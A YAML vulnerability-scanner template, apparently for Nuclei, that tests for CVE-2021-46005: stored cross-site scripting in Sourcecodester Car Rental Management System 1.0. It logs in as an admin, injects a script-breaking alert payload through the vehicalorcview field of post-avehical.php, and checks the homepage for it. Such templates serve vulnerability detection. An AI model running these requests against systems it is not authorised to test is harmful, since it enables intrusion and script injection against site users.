id: CVE-2021-46005
info:
  author: cckuailong
  classification:
    cve-id: CVE-2021-46005
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
  description: Sourcecodester Car Rental Management System 1.0 is vulnerable to cross-site
    scripting via the vehicalorcview parameter.
  name: Sourcecodester Car Rental Management System 1.0 - Stored Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/49546
  - https://nvd.nist.gov/vuln/detail/CVE-2021-46005
  - https://www.sourcecodester.com/cc/14145/online-car-rental-system-using-phpmysql.html
  severity: medium
  tags: cve,cve2021,xss,sourcecodester,authenticated
requests:
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /admin/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Connection: close


    username={{username}}&password={{password}}&login=

    '
  - 'POST /admin/post-avehical.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypWqYipqU21aYgccv


    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="vehicletitle"


    Test

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="brandname"


    1

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="vehicalorcview"


    </script><script>alert(document.domain)</script>

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="priceperday"


    500

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="fueltype"


    Petrol

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="modelyear"


    2022

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="seatingcapacity"


    5

    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="img1"; filename="test.png"

    Content-Type: image/png



    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="img2"; filename="test.png"

    Content-Type: image/png



    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="img3"; filename="test.png"

    Content-Type: image/png



    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="img4"; filename="test.png"

    Content-Type: image/png



    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="img5"; filename=""

    Content-Type: application/octet-stream



    ------WebKitFormBoundarypWqYipqU21aYgccv

    Content-Disposition: form-data; name="submit"



    ------WebKitFormBoundarypWqYipqU21aYgccv--

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
